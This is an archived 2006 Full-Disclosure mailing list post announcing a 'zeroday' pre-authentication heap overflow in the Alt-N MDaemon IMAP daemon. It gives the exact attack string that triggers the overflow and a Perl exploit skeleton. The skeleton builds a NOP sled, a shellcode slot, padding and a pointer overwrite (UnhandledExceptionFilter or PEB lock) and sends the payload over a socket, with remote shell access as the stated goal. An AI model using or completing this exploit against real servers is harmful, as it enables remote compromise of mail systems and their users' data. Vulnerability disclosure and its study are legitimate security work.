=== Content from marc.info_24fccf45_20250125_194801.html ===

```
[[prev in list](?l=full-disclosure&m=114881290700508&w=2)] [[next in list](?l=full-disclosure&m=114882364216131&w=2)] [prev in thread] [[next in thread](?l=full-disclosure&m=114882364216131&w=2)]
List:       [full-disclosure](?l=full-disclosure&r=1&w=2)
Subject:    [[Full-disclosure] *zeroday warez* MDAEMON LATEST VERSION PREAUTH](?t=114882271600004&r=1&w=2)
From:       [kcope <kingcope () gmx ! net>](?a=112151573800001&r=1&w=2)
Date:       [2006-05-28 13:24:30](?l=full-disclosure&r=1&w=2&b=200605)
Message-ID: [4479A48E.60104 () gmx ! net](?i=4479A48E.60104%20()%20gmx%20!%20net)
[Download RAW [message](?l=full-disclosure&m=114882270912151&q=mbox) or [body](?l=full-disclosure&m=114882270912151&q=raw)]

MDAEMON LATEST VERSION PREAUTH *REMOTE ROOT HOLE*

zeroday discovered by kcope kingcope[at]gmx.net !!!
shouts to alex,wY!,bogus,revoguard,adizeone

Description
There's a remotely exploitable preauthentication hole in Alt-N MDaemon.
It is a Heap Overflow in the IMAP Daemon.
It can be triggered by sending the following attack string:
a001 "[X]\r\n
Look specifically at the " it is important :)
[X] consists of f.e. 99555 Z's to reach the 4 byte overwrite.
Now one can use the 4 byte overwrite in some PEB pointer overwrite to
open a remote shell. UnhandledExceptionFilter is also possible I think.
No exploit is delivered at this time, figure it out yourself (use the
PEB Lock) :)

Sample code:
 $where = "\x4c\x14\xed\x77"; # UnhandledExceptionFilter 77ED144C
 #$where = "\x20\xf0\xfd\x7f"; # PEB Lock Pointer 7FFDF000
 $what = "\x3d\xb9\x82\x02"; # JMP EDX 03bfcb9A

 $nops = "A" x 100;
 $a = $nops . $shellcode . ("Z" x
(0x2006-length($shellcode)-length($nops))) . $what . $where . ("Z" x
(0x184AC - 0x200A - 12));
 print $sock "a001 \"$a\r\n";
 close($sock);

Best Regards,
kcope

_______________________________________________
Full-Disclosure - We believe in it.
Charter: <http://lists.grok.org.uk/full-disclosure-charter.html>
Hosted and sponsored by Secunia - <http://secunia.com/>
[[prev in list](?l=full-disclosure&m=114881290700508&w=2)] [[next in list](?l=full-disclosure&m=114882364216131&w=2)] [prev in thread] [[next in thread](?l=full-disclosure&m=114882364216131&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


